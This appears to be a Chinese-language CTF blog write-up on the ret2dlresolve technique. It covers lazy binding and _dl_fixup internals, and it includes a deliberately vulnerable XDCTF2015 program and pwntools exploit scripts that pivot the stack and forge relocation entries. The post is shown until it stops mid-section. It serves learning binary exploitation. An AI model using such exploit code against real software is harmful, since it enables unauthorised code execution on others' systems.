@@ -1,0 +1,977 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ret2dl," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Archerの博客" type="application/atom+xml" />
+
+
+
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2dllab">
+<meta property="og:url" content="http://example.com/2021/08/12/ret2dllab/index.html">
+<meta property="og:site_name" content="Archerの博客">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/2021-08-12155841.png">
+<meta property="og:image" content="http://example.com/images/2021-08-12170141.png">
+<meta property="article:published_time" content="2021-08-12T02:36:30.000Z">
+<meta property="article:modified_time" content="2021-08-13T13:48:28.934Z">
+<meta property="article:author" content="Archer">
+<meta property="article:tag" content="ret2dl">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/2021-08-12155841.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+
+
+
+
+  <title>ret2dllab | Archerの博客</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Archerの博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">记录一个菜鸡的成长之路</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-首页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-about"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-categories"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archives"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/08/12/ret2dllab/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Archerの博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ret2dllab</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-08-12T10:36:30+08:00">
+                2021-08-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctfpwn/" itemprop="url" rel="index">
+                    <span itemprop="name">ctfpwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2021/08/12/ret2dllab/" class="leancloud_visitors" data-flag-title="ret2dllab">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+              <div class="post-description">
+                  Thu Aug 12 2021 00:00:00 GMT+0800 (中国标准时间)
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>实验内容参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51868336/article/details/114644569">https://blog.csdn.net/qq_51868336/article/details/114644569</a></p>
+<h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><h3 id="延迟绑定-PLT"><a href="#延迟绑定-PLT" class="headerlink" title="延迟绑定(PLT)"></a>延迟绑定(PLT)</h3><p>当函数第一次被用到时才进行绑定(符号查找、重定位等)，先通过PLT跳转，并且每个外部函数都在PLT中有一个相关<br>的项，比如write对应的write就为write@plt,在ida中的plt结构如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.plt:<span class="number">08048396</span>                 push    <span class="number">0</span></span><br><span class="line">.plt:<span class="number">0804839B</span>                 jmp     sub_8048380</span><br><span class="line">.plt:<span class="number">080483</span>A0 ; [<span class="number">00000006</span> BYTES: COLLAPSED FUNCTION _read. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br><span class="line">.plt:<span class="number">080483</span>A6 ; ---------------------------------------------------------------------------</span><br><span class="line">.plt:<span class="number">080483</span>A6                 push    <span class="number">8</span></span><br><span class="line">.plt:<span class="number">080483</span>AB                 jmp     sub_8048380</span><br><span class="line">.plt:<span class="number">080483B</span>0 ; [<span class="number">00000006</span> BYTES: COLLAPSED FUNCTION _strlen. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br><span class="line">.plt:<span class="number">080483B</span>6 ; ---------------------------------------------------------------------------</span><br><span class="line">.plt:<span class="number">080483B</span>6                 push    <span class="number">10</span>h</span><br><span class="line">.plt:<span class="number">080483B</span>B                 jmp     sub_8048380</span><br><span class="line">.plt:<span class="number">080483</span>C0 ; [<span class="number">00000006</span> BYTES: COLLAPSED FUNCTION ___libc_start_main. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br><span class="line">.plt:<span class="number">080483</span>C6 ; ---------------------------------------------------------------------------</span><br><span class="line">.plt:<span class="number">080483</span>C6                 push    <span class="number">18</span>h</span><br><span class="line">.plt:<span class="number">080483</span>CB                 jmp     sub_8048380</span><br><span class="line">.plt:<span class="number">080483</span>D0 ; [<span class="number">00000006</span> BYTES: COLLAPSED FUNCTION _write. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br><span class="line">.plt:<span class="number">080483</span>D6 ; ---------------------------------------------------------------------------</span><br><span class="line">.plt:<span class="number">080483</span>D6                 push    <span class="number">20</span>h ; <span class="string">&#x27; &#x27;</span></span><br><span class="line">.plt:<span class="number">080483</span>DB                 jmp     sub_8048380</span><br></pre></td></tr></table></figure>
+<p>假设有个bar()函数，bar()函数在plt中的项的地址为bar@plt<br>bar@plt的实现</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bar@plt:</span><br><span class="line">jmp *(bar@GOT)</span><br><span class="line">push n</span><br><span class="line">push moduleID</span><br><span class="line">jump _dl_runtime_resolve</span><br></pre></td></tr></table></figure>
+<p>write函数的执行过程如下<br><img src="/images/2021-08-12155841.png"><br>call write之后就会执行这一步，对应上面bar@plt的实现的第一步，此时ds指向0x804a01c(got.plt上write的)，并且0x804a01c中存放的<br>地址为push n的地址，然后push n，n对应的是write函数在rel.plt(重定位表)上的偏移<br>rel.plt例子如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">08048330</span> ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:<span class="number">08048330</span>                 Elf32_Rel &lt;<span class="number">804</span>A00Ch, <span class="number">107</span>h&gt; ; R_386_JMP_SLOT setbuf</span><br><span class="line">LOAD:<span class="number">08048338</span>                 Elf32_Rel &lt;<span class="number">804</span>A010h, <span class="number">207</span>h&gt; ; R_386_JMP_SLOT read</span><br><span class="line">LOAD:<span class="number">08048340</span>                 Elf32_Rel &lt;<span class="number">804</span>A014h, <span class="number">407</span>h&gt; ; R_386_JMP_SLOT <span class="built_in">strlen</span></span><br><span class="line">LOAD:<span class="number">08048348</span>                 Elf32_Rel &lt;<span class="number">804</span>A018h, <span class="number">507</span>h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br><span class="line">LOAD:<span class="number">08048350</span>                 Elf32_Rel &lt;<span class="number">804</span>A01Ch, <span class="number">607</span>h&gt; ; R_386_JMP_SLOT write</span><br><span class="line"><span class="comment">//107h-607h是各函数在sym表上的偏移，前面的地址对应各函数在got.plt的地址</span></span><br></pre></td></tr></table></figure>
+<p>下一步push   dword ptr [<em>GLOBAL_OFFSET_TABLE</em>+4] &lt;0x804a004&gt;，这里是将0x804a004指向的内容压栈，<br>对应push moduleID，然后程序就跳到_dl_runtime_resolve这个函数，这个函数会完成函数的解析，并在got.plt中填入<br>函数的真实地址<br>_ dl_runtime_resolve(link_map,reloc_arg)，link_map对应的是push moduleID,reloc_arg对应的是push n</p>
+<h3 id="dl-fixup"><a href="#dl-fixup" class="headerlink" title="_ dl_fixup"></a>_ dl_fixup</h3><p>_ dl_runtime_reslove实际上就是调用了_ dl_fixup函数，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(struct link_map *l,ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 首先通过参数reloc_arg计算重定位的入口，这里的JMPREL即.rel.plt，reloc_offest即reloc_arg</span></span><br><span class="line">	<span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">	<span class="comment">// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span></span><br><span class="line">	<span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">	<span class="comment">// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JMUP_SLOT=7</span></span><br><span class="line">	assert(ELF(R_TYPE)(reloc-&gt;info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">	<span class="comment">// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span></span><br><span class="line">	result = _dl_lookup_symbol_x (strtab + sym -&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span></span><br><span class="line">	value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">	<span class="comment">// 最后把value写入相应的GOT表条目中</span></span><br><span class="line">	<span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><h3 id="1-搭建环境"><a href="#1-搭建环境" class="headerlink" title="1.搭建环境"></a>1.搭建环境</h3><p>源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">	read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">	write(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">	vuln();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译生成可执行文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-<span class="built_in">stack</span>-protector -m32 -z relro -no-pie rof.c -o parelro_x64</span><br></pre></td></tr></table></figure>
+<p>保护机制如下<br><img src="/images/2021-08-12170141.png"></p>
+<h3 id="2-伪造栈，调用write"><a href="#2-伪造栈，调用write" class="headerlink" title="2.伪造栈，调用write"></a>2.伪造栈，调用write</h3><p>思路先将栈迁移到bss段上，并在bss段上布置数据,这一部分主要就是伪造个栈，然后调用write函数，没什么难点<br>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ppp_ret = <span class="number">0x08048619</span> <span class="comment">#pop esi; pop edi; pop ebp; ret</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804861b</span> <span class="comment">#pop ebp; ret</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment"># leave; ret</span></span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&#x27;A&#x27;</span> * offset</span><br><span class="line">, p32(read_plt)</span><br><span class="line">, p32(ppp_ret)</span><br><span class="line">, p32(<span class="number">0</span>)</span><br><span class="line">, p32(base_stage)</span><br><span class="line">, p32(<span class="number">100</span>)</span><br><span class="line">, p32(pop_ebp_ret)</span><br><span class="line">, p32(base_stage)</span><br><span class="line">, p32(leave_ret))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> </span><br><span class="line">index_offset = <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload2 = flat(<span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">, p32(plt_0) <span class="comment">#call plt_0</span></span><br><span class="line">, index_offset <span class="comment">#对应push 20h</span></span><br><span class="line">, <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">, p32(<span class="number">1</span>)</span><br><span class="line">, p32(base_stage + <span class="number">80</span>)</span><br><span class="line">, p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">, <span class="string">&#x27;A&#x27;</span> * <span class="number">52</span></span><br><span class="line">, cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">, <span class="string">&#x27;A&#x27;</span> * <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-伪造reloc-arg"><a href="#3-伪造reloc-arg" class="headerlink" title="3.伪造reloc_arg"></a>3.伪造reloc_arg</h3><p>reloc_arg对应push n的那个n，基地址为0x08048330(ELF JMPREL Relocation Table的地址)<br>rel的结构体如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	Elf32_Addr r_offset; <span class="comment">// 在下面的exp中对应write的got表0x804a01c</span></span><br><span class="line">	Elf32_Word r_info; <span class="comment">// 对应0x607</span></span><br><span class="line">&#125;Elf32_Rel;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ppp_ret = <span class="number">0x08048619</span> <span class="comment">#pop esi; pop edi; pop ebp; ret</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804861b</span> <span class="comment">#pop ebp; ret</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment"># leave; ret</span></span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&#x27;A&#x27;</span> * offset</span><br><span class="line">, p32(read_plt)</span><br><span class="line">, p32(ppp_ret)</span><br><span class="line">, p32(<span class="number">0</span>)</span><br><span class="line">, p32(base_stage)</span><br><span class="line">, p32(<span class="number">100</span>)</span><br><span class="line">, p32(pop_ebp_ret)</span><br><span class="line">, p32(base_stage)</span><br><span class="line">, p32(leave_ret))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> </span><br><span class="line">rel_plt = <span class="number">0x08048330</span></span><br><span class="line">index_offset = <span class="number">0x20</span></span><br><span class="line">fake_offset = base_stage + <span class="number">28</span> - rel_plt</span><br><span class="line">write_got = <span class="number">0x804A01C</span> <span class="comment">#elf.got[&#x27;write&#x27;]</span></span><br><span class="line">r_info = <span class="number">0x607</span></span><br><span class="line">fake_write = flat(p32(write_got),p32(r_info))</span><br><span class="line">payload2 = flat(<span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">, p32(plt_0) <span class="comment">#call plt_0</span></span><br><span class="line">, fake_offset</span><br><span class="line">, <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">, p32(<span class="number">1</span>)</span><br><span class="line">, p32(base_stage + <span class="number">80</span>)</span><br><span class="line">, p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">,fake_write</span><br><span class="line">, <span class="string">&#x27;A&#x27;</span> * <span class="number">44</span></span><br><span class="line">, cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">, <span class="string">&#x27;A&#x27;</span> * <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-伪造r-info"><a href="#4-伪造r-info" class="headerlink" title="4.伪造r_info"></a>4.伪造r_info</h3><p>通过伪造r_info可以控制sym落在可控制段，从而控制他的str_name</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line"><span class="comment">// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JMUP_SLOT=7</span></span><br><span class="line">assert(ELF(R_TYPE)(reloc-&gt;info) == ELF_MACHINE_JMP_SLOT);</span><br></pre></td></tr></table></figure>
+<p>sym的结构体定义如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	Elf32_Word st_name; <span class="comment">// Symbol name(string tbl index)</span></span><br><span class="line">	Elf32_Addr st_value; <span class="comment">// Symbol value</span></span><br><span class="line">	Elf32_word st_size; <span class="comment">// Symbol size</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">// Symbol type and binding</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; <span class="comment">// symbol visibility under glibc&gt;=2.2</span></span><br><span class="line">	Elf32_Section st_shndx; <span class="comment">// Section index</span></span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure>
+<p>ida中的sym如下</p>
